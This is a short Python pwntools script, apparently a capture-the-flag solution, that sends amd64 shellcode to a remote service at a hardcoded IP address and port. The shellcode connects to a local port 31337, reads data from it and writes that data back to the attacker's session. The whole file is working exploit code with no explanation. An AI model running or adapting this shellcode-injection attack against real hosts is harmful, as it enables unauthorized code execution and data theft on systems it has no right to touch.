from pwn import *

context.arch = 'amd64'
io = remote("109.233.56.90", 11666)
src = shellcraft.amd64.linux.connect("localhost", 31337)
src += shellcraft.amd64.linux.read('rbp', 'rsp', 0x400)
src += shellcraft.amd64.linux.write(1, 'rsp', 'rax')
src += shellcraft.amd64.linux.exit(0)
print(src)
io.send(asm(src).ljust(0x400, b'\x00'))

io.interactive()
